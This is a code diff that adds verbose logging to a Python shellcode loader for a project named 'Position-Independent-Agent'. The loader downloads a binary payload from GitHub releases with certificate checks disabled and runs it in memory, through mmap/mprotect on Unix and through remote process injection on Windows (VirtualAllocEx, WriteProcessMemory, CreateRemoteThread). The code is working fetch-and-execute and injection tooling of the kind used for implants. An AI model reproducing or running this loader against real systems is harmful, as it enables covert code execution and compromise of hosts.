@@ -29,6 +29,7 @@ import platform
 import ssl
 import struct
 import sys
+import time
 
 # Python 2/3 urllib compatibility
 try:
@@ -42,6 +43,40 @@ except ImportError:
 # checks add no security and break on hosts with outdated CA stores.
 
 REPO = "mrzaxaryan/Position-Independent-Agent"
+
+# =============================================================================
+# Logging
+# =============================================================================
+
+_LOG_LEVELS = {'dbg': 0, 'inf': 1, 'ok': 2, 'wrn': 3, 'err': 4}
+_LOG_PREFIXES = {
+    'dbg': '[-]',
+    'inf': '[*]',
+    'ok':  '[+]',
+    'wrn': '[!]',
+    'err': '[x]',
+}
+_log_verbosity = _LOG_LEVELS['dbg']
+_log_start = time.time()
+
+
+def _log(level, msg):
+    """Log with timestamp, level prefix, and immediate flush."""
+    if _LOG_LEVELS.get(level, 1) < _log_verbosity:
+        return
+    elapsed = time.time() - _log_start
+    prefix = _LOG_PREFIXES.get(level, '[*]')
+    print("%s %8.3fs  %s" % (prefix, elapsed, msg))
+    sys.stdout.flush()
+
+
+def _hexdump(data, n=32):
+    """Return first n bytes as a hex string for diagnostics."""
+    chunk = data[:n]
+    hex_str = ' '.join('%02x' % (b if isinstance(b, int) else ord(b)) for b in chunk)
+    if len(data) > n:
+        hex_str += ' ...'
+    return hex_str
 
 # =============================================================================
 # Architecture Definitions
@@ -143,30 +178,44 @@ def get_host():
 
 def _make_ssl_context():
     """Create a permissive SSL context for maximum compatibility."""
+    _log('dbg', "OpenSSL: %s" % getattr(ssl, 'OPENSSL_VERSION', 'unknown'))
     try:
         proto = getattr(ssl, 'PROTOCOL_TLS', None) or ssl.PROTOCOL_SSLv23
+        proto_name = 'PROTOCOL_TLS' if hasattr(ssl, 'PROTOCOL_TLS') else 'PROTOCOL_SSLv23'
+        _log('dbg', "SSL protocol: %s (0x%x)" % (proto_name, proto))
         ctx = ssl.SSLContext(proto)
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
         try:
             ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
+            _log('dbg', "SSL cipher security level: relaxed")
         except ssl.SSLError:
-            pass
+            _log('dbg', "SSL cipher security level: default (SECLEVEL=0 unsupported)")
         return ctx
-    except Exception:
+    except Exception as e:
+        _log('wrn', "SSL context creation failed: %s" % e)
         return None
 
 
 def _http_get(url):
     req = Request(url, headers={"User-Agent": "PIA-Loader/1.0"})
     ctx = _make_ssl_context()
+    if ctx:
+        _log('ok', "SSL context ready")
+    else:
+        _log('wrn', "SSL context unavailable, using system defaults")
+    _log('inf', "Connecting to %s ..." % url.split('/')[2])
     try:
         resp = urlopen(req, context=ctx) if ctx else urlopen(req)
     except TypeError:
-        # Python < 2.7.9 / 3.4.3: urlopen doesn't accept context=
+        _log('wrn', "urlopen(context=) unsupported, retrying without context")
         resp = urlopen(req)
+    code = getattr(resp, 'status', None) or getattr(resp, 'code', '?')
+    _log('ok', "HTTP %s — reading response body" % code)
     try:
-        return resp.read()
+        data = resp.read()
+        _log('ok', "Received %d bytes" % len(data))
+        return data
     finally:
         resp.close()
 
@@ -177,31 +226,36 @@ DEFAULT_TAG = "preview"
 def download(platform_name, arch, tag):
     if not tag:
         tag = DEFAULT_TAG
-        print("[+] Using tag: %s" % tag)
+        _log('inf', "No tag specified, using default: %s" % tag)
 
     asset = "%s-%s.bin" % (platform_name, arch)
     url = "https://github.com/%s/releases/download/%s/%s" % (REPO, tag, asset)
 
-    print("[*] Downloading: %s" % asset)
-    print("[*] URL: %s" % url)
+    _log('inf', "Asset: %s" % asset)
+    _log('inf', "URL:   %s" % url)
+    _log('inf', "Downloading ...")
     try:
         data = _http_get(url)
     except HTTPError as e:
         if e.code == 404:
-            print("[-] Asset '%s' not found in release %s." % (asset, tag))
-            print("    URL: %s" % url)
+            _log('err', "Asset not found (HTTP 404): %s @ %s" % (asset, tag))
+            _log('err', "URL: %s" % url)
             sys.exit(1)
+        _log('err', "HTTP error %d: %s" % (e.code, e.reason))
         raise
 
     # Validate: reject obviously wrong payloads before executing as shellcode
+    _log('inf', "Validating payload (%d bytes)" % len(data))
+    _log('dbg', "Header: %s" % _hexdump(data))
     if len(data) < 64:
-        print("[-] Downloaded data too small (%d bytes) - not valid shellcode" % len(data))
+        _log('err', "Payload too small (%d bytes) — not valid shellcode" % len(data))
         sys.exit(1)
     header = data[:256]
     if b'<!DOCTYPE' in header or b'<html' in header or b'<HTML' in header:
-        print("[-] Downloaded data is HTML, not shellcode (check network/proxy)")
+        _log('err', "Payload is HTML, not shellcode (check network/proxy)")
         sys.exit(1)
 
+    _log('ok', "Payload validated — %d bytes" % len(data))
     return data
 
 
@@ -232,25 +286,28 @@ def run_mmap(shellcode):
     """Map shellcode RW, flip to RX via mprotect, execute."""
     size = len(shellcode)
 
+    _log('inf', "mmap: allocating %d bytes (RW, MAP_PRIVATE)" % size)
     # MAP_PRIVATE is required — the default MAP_SHARED causes mprotect to
     # silently refuse PROT_EXEC on Solaris (and some hardened Linux kernels).
     mem = mmap.mmap(-1, size, flags=_MAP_PRIVATE, prot=_PROT_READ | _PROT_WRITE)
     mem.write(shellcode)
     addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
+    _log('ok', "mmap: base=0x%x  size=%d" % (addr, size))
 
     libc = ctypes.CDLL(None, use_errno=True)
     page_size = os.sysconf('SC_PAGE_SIZE')
     aligned = addr & ~(page_size - 1)
     total = size + (addr - aligned)
+    _log('inf', "mprotect: aligned=0x%x  total=%d  page_size=%d  prot=RX" % (aligned, total, page_size))
     if libc.mprotect(ctypes.c_void_p(aligned), ctypes.c_size_t(total),
                      _PROT_READ | _PROT_EXEC) != 0:
         raise OSError("mprotect failed (errno=%d)" % ctypes.get_errno())
+    _log('ok', "mprotect: RW -> RX")
 
     _flush_icache(addr, size)
 
-    print("[+] Entry: 0x%x" % addr)
-    print("[*] Executing...")
-    sys.stdout.flush()
+    _log('ok', "Entry point: 0x%x" % addr)
+    _log('inf', "Transferring control to shellcode ...")
     return ctypes.CFUNCTYPE(ctypes.c_int)(addr)()
 
 
@@ -344,9 +401,12 @@ def run_injected(shellcode, target_arch, cross_family=False):
     if not host_exe or not os.path.exists(host_exe):
         raise OSError("No suitable host process for %s" % target_arch)
 
-    print("[+] Host process: %s" % host_exe)
+    _log('inf', "Target arch: %s  host process: %s" % (target_arch, host_exe))
+    _log('inf', "Cross-family: %s" % cross_family)
+    _log('dbg', "Configuring kernel32 API prototypes")
 
     k32 = setup_kernel32()
+    _log('ok', "kernel32 API ready")
 
     class STARTUPINFOW(ctypes.Structure):
         _fields_ = [
@@ -400,7 +460,7 @@ def run_injected(shellcode, target_arch, cross_family=False):
         siex.lpAttributeList = ctypes.addressof(attr_list_buf)
         creation_flags |= EXTENDED_STARTUPINFO_PRESENT
 
-        print("[*] Machine type override: 0x%04x" % MACHINE_TYPE[target_arch])
+        _log('inf', "Machine type override: 0x%04x (%s)" % (MACHINE_TYPE[target_arch], target_arch))
 
         if not k32.CreateProcessW(
             host_exe, None, None, None, False, creation_flags,
@@ -415,33 +475,34 @@ def run_injected(shellcode, target_arch, cross_family=False):
         if not k32.CreateProcessW(host_exe, None, None, None, False, creation_flags, None, None, ctypes.byref(si), ctypes.byref(pi)):
             raise OSError("CreateProcessW failed: %d" % k32.GetLastError())
 
-    print("[+] Created process PID: %d" % pi.dwProcessId)
+    _log('ok', "CreateProcessW: PID=%d  handle=0x%x" % (pi.dwProcessId, pi.hProcess or 0))
 
     try:
+        _log('inf', "VirtualAllocEx: size=%d  protect=PAGE_READWRITE (0x%02x)" % (len(shellcode), PAGE_READWRITE))
         remote_mem = k32.VirtualAllocEx(pi.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE)
         if not remote_mem:
-            raise OSError("VirtualAllocEx failed: %d" % k32.GetLastError())
+            raise OSError("VirtualAllocEx failed (GetLastError=%d)" % k32.GetLastError())
+        _log('ok', "VirtualAllocEx: addr=0x%x" % remote_mem)
 
-        print("[+] Remote memory (RW): 0x%x" % remote_mem)
-
+        _log('inf', "WriteProcessMemory: dst=0x%x  size=%d" % (remote_mem, len(shellcode)))
         written = ctypes.c_size_t()
         if not k32.WriteProcessMemory(pi.hProcess, remote_mem, shellcode, len(shellcode), ctypes.byref(written)):
-            raise OSError("WriteProcessMemory failed: %d" % k32.GetLastError())
+            raise OSError("WriteProcessMemory failed (GetLastError=%d)" % k32.GetLastError())
+        _log('ok', "WriteProcessMemory: %d / %d bytes written" % (written.value, len(shellcode)))
 
-        print("[+] Written: %d bytes" % written.value)
-
+        _log('inf', "VirtualProtectEx: addr=0x%x  PAGE_READWRITE -> PAGE_EXECUTE_READ (0x%02x)" % (remote_mem, PAGE_EXECUTE_READ))
         old_protect = wintypes.DWORD()
         if not k32.VirtualProtectEx(pi.hProcess, remote_mem, len(shellcode), PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
-            raise OSError("VirtualProtectEx failed: %d" % k32.GetLastError())
+            raise OSError("VirtualProtectEx failed (GetLastError=%d)" % k32.GetLastError())
+        _log('ok', "VirtualProtectEx: old_protect=0x%02x" % old_protect.value)
 
-        print("[+] Entry (RX): 0x%x" % remote_mem)
-        print("[*] Executing...")
-        sys.stdout.flush()
-
+        _log('inf', "CreateRemoteThread: entry=0x%x" % remote_mem)
         remote_thread = k32.CreateRemoteThread(pi.hProcess, None, 0, remote_mem, None, 0, None)
         if not remote_thread:
-            raise OSError("CreateRemoteThread failed: %d" % k32.GetLastError())
+            raise OSError("CreateRemoteThread failed (GetLastError=%d)" % k32.GetLastError())
+        _log('ok', "CreateRemoteThread: handle=0x%x" % (remote_thread or 0))
 
+        _log('inf', "WaitForSingleObject: waiting for thread completion ...")
         k32.WaitForSingleObject(remote_thread, INFINITE)
 
         code = wintypes.DWORD()
@@ -483,8 +544,10 @@ def main():
     # a native-arch process, so it can use the true OS bitness.
     exec_bits = python_bits if host_os != 'windows' else host_bits
 
-    print("[*] Host: %s/%s/%dbit" % (host_os, host_family, host_bits))
-    print("[*] Python: %dbit" % python_bits)
+    _log('inf', "Host: %s/%s/%dbit" % (host_os, host_family, host_bits))
+    _log('inf', "Python: %s (%dbit)" % (platform.python_version(), python_bits))
+    _log('dbg', "sys.platform: %s  machine: %s" % (sys.platform, platform.machine()))
+    _log('dbg', "Exec bits: %d  (method: %s)" % (exec_bits, "inject" if host_os == 'windows' else "mmap"))
 
     if shellcode_path:
         # --- Local mode: load from file ---
@@ -492,18 +555,20 @@ def main():
             parser.error("--arch is required when loading from a local file")
 
         target = ARCH[arch]
-        print("[*] Target: %s" % arch)
+        _log('inf', "Target arch: %s (%dbit, %s)" % (arch, target['bits'], target['family']))
+        _log('inf', "Loading shellcode from: %s" % shellcode_path)
 
         with open(shellcode_path, 'rb') as f:
             shellcode = f.read()
-        print("[+] Loaded: %d bytes" % len(shellcode))
+        _log('ok', "Loaded %d bytes from disk" % len(shellcode))
+        _log('dbg', "Header: %s" % _hexdump(shellcode))
 
         if host_os == 'windows':
             cross_family = host_family != target['family']
             code = run_injected(shellcode, arch, cross_family=cross_family)
         elif target['family'] != host_family or target['bits'] != exec_bits:
-            print("[-] Cannot load %s shellcode in %dbit Python on %s/%dbit host"
-                  % (arch, python_bits, host_family, host_bits))
+            _log('err', "Arch mismatch: cannot run %s shellcode in %dbit Python on %s/%dbit"
+                 % (arch, python_bits, host_family, host_bits))
             sys.exit(1)
         else:
             code = run_mmap(shellcode)
@@ -511,18 +576,18 @@ def main():
         # --- Remote mode: download from GitHub ---
         key = (host_os, host_family, exec_bits)
         if key not in _ARTIFACT_MAP:
-            print("[-] Unsupported host: %s/%s/%dbit (Python %dbit)"
-                  % (host_os, host_family, host_bits, python_bits))
+            _log('err', "Unsupported host: %s/%s/%dbit (Python %dbit)"
+                 % (host_os, host_family, host_bits, python_bits))
             sys.exit(1)
 
         plat, remote_arch = _ARTIFACT_MAP[key]
         if arch:
+            _log('inf', "Arch override: %s -> %s" % (remote_arch, arch))
             remote_arch = arch
-        print("[*] Platform: %s/%s" % (plat, remote_arch))
-        print("[*] Release: %s" % (tag or DEFAULT_TAG))
+        _log('inf', "Platform: %s  arch: %s  tag: %s" % (plat, remote_arch, tag or DEFAULT_TAG))
 
         shellcode = download(plat, remote_arch, tag)
-        print("[+] Loaded: %d bytes" % len(shellcode))
+        _log('ok', "Shellcode ready: %d bytes" % len(shellcode))
 
         if host_os == 'windows':
             target = ARCH[remote_arch]
@@ -531,7 +596,8 @@ def main():
         else:
             code = run_mmap(shellcode)
 
-    print("[+] Exit: %d" % code)
+    elapsed = time.time() - _log_start
+    _log('ok', "Exit code: %d  (%.3fs elapsed)" % (code, elapsed))
     os._exit(code)
 
 
